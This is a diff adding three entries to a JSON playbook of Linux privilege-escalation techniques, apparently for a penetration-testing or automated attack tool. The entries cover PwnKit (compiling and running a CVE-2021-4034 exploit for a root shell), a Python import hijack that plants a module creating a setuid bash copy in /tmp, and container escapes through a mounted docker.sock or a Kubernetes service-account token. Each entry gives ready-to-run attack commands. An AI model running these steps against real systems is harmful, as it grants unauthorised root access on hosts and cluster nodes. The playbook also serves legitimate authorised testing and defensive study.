@@ -872,6 +872,174 @@
           "note": "Reload and start it, or wait for its timer; uid=0 confirms root."
         }
       ]
+    },
+    {
+      "id": "polkit-abuse",
+      "title": "polkit / pkexec Abuse (PwnKit, D-Bus)",
+      "phase": "escalate",
+      "os": [
+        "linux"
+      ],
+      "hypothesis": "polkit decides whether an unprivileged process may run a privileged action over D-Bus, and pkexec is its setuid helper. pkexec carried PwnKit (CVE-2021-4034), an instant local root on almost every Linux box for a decade, and policy misconfigurations or the CVE-2021-3560 race let you call privileged D-Bus actions you should not. The tell is simply that pkexec exists unpatched, or a D-Bus service exposes a loosely-policed action. Check the pkexec version first; it is often the fastest root on the box.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "gcc",
+        "busctl"
+      ],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 54,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "root via a vulnerable pkexec or a permissively-policed D-Bus action",
+      "does_not_prove": "anything where pkexec is patched and no D-Bus action has a loose policy",
+      "report": {
+        "finding": "polkit/pkexec local privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "ls -l /usr/bin/pkexec && pkexec --version",
+          "note": "setuid pkexec before the 2022 fix is PwnKit-vulnerable (CVE-2021-4034)."
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc {{exploit_src}} -o pwn && ./pwn",
+          "note": "A public CVE-2021-4034 PoC compiles on-box and drops a root shell; stage a precompiled binary if there is no compiler."
+        },
+        {
+          "tool": "busctl",
+          "run": "busctl list | grep -i accounts",
+          "note": "If pkexec is patched, look for a D-Bus action with a permissive policy (CVE-2021-3560 raced the accounts daemon)."
+        },
+        {
+          "tool": "sh",
+          "run": "id",
+          "note": "uid=0 confirms root; clean up any user you created."
+        }
+      ]
+    },
+    {
+      "id": "python-library-hijack",
+      "title": "Python Library / Import Path Hijack",
+      "phase": "escalate",
+      "os": [
+        "linux"
+      ],
+      "hypothesis": "When root runs a Python script and any directory on its module search path is writable by you, you plant a module the script imports and your code runs as root. Python searches the script directory first, then PYTHONPATH, then site-packages, so a writable script directory, a writable PYTHONPATH entry, or world-writable site-packages all give the hijack. The tell is a root cron or sudo-run Python script whose directory, or an importable path it uses, you can write.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "python3"
+      ],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell",
+        "privesc.cron"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 50,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root where a privileged Python script imports a module from a path you can write",
+      "does_not_prove": "anything unless a writable path entry out-ranks the real module",
+      "report": {
+        "finding": "Python import-path hijack of a root-run script",
+        "severity": "high"
+      },
+      "refs": [
+        "https://docs.python.org/3/library/sys.html#sys.path"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat /etc/crontab; sudo -l 2>/dev/null | grep -i '\\.py'",
+          "note": "Find a root cron or sudo entry running a Python script: the imports you want to hijack."
+        },
+        {
+          "tool": "sh",
+          "run": "head -5 {{script_path}}",
+          "note": "A local (non-stdlib) import is the easiest to shadow; note its module name."
+        },
+        {
+          "tool": "sh",
+          "run": "ls -ld {{script_dir}} && python3 -c \"import sys;print(sys.path[0])\"",
+          "note": "The script's own directory is first on sys.path; a writable one lets you shadow any import."
+        },
+        {
+          "tool": "sh",
+          "run": "echo 'import os; os.system(\"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\")' > {{script_dir}}/{{module}}.py",
+          "note": "Plant a module with the imported name; it runs as root on the next execution. Then /tmp/rb -p."
+        }
+      ]
+    },
+    {
+      "id": "container-escape",
+      "title": "Container / Kubernetes Escape to Node",
+      "phase": "escalate",
+      "os": [
+        "linux"
+      ],
+      "hypothesis": "A container is not the objective; the node is. A --privileged (or CAP_SYS_ADMIN) container can mount the host disk or abuse cgroups to run on the host; a mounted Docker socket lets you start a container that bind-mounts the host root; and a Kubernetes service-account token with a permissive role lets you create a privileged pod or exec onto a node. The tell is a token under /var/run/secrets, a docker.sock in the mounts, or a capability set that should never be in a container.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "docker",
+        "kubectl"
+      ],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 52,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "host (node) root from inside a container via privilege, a mounted socket, or a service-account token",
+      "does_not_prove": "anything where the container has no excess privilege, no mounted socket, and no usable token",
+      "report": {
+        "finding": "Container escape to host/node",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null",
+          "note": "A docker cgroup or /.dockerenv means you are containerized; the goal is escaping to the host."
+        },
+        {
+          "tool": "sh",
+          "run": "capsh --print | grep -i sys_admin; grep CapEff /proc/self/status",
+          "note": "A full CapEff mask or CAP_SYS_ADMIN is effectively privileged; mount the host disk or abuse cgroups."
+        },
+        {
+          "tool": "docker",
+          "run": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh",
+          "note": "A mounted docker.sock is root on the host by design; bind-mount / and chroot in."
+        },
+        {
+          "tool": "kubectl",
+          "run": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i create pods",
+          "note": "A permissive service-account token lets you create a privileged pod that mounts the host filesystem."
+        }
+      ]
     }
   ]
 }
